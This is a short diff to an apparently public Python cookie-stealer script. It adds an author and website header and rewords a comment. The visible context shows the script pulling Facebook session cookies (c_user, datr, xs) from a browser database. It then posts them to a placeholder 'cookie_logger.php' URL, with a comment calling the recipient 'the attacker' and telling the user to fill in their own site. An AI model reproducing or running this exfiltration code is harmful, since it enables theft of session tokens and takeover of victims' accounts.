@@ -1,3 +1,7 @@
+#20th Jan,2015
+#author:Rashid feroz[rashid.2008feroz@gmail.com]
+#website:Hackwhiz.com
+
 import os
 import psutil
 import sqlite3
@@ -67,7 +71,7 @@ conn.close()
 xs=str(xs)
 
 #sending the cookie data to the attacker using POST request.
-#enter your webhost here in the url field.
+#enter your website here in the url field.
 
 url = 'http://your-website.com/cookie_logger.php'
 payload = {'c_user': c_user, 'datr': datr,'xs': xs}
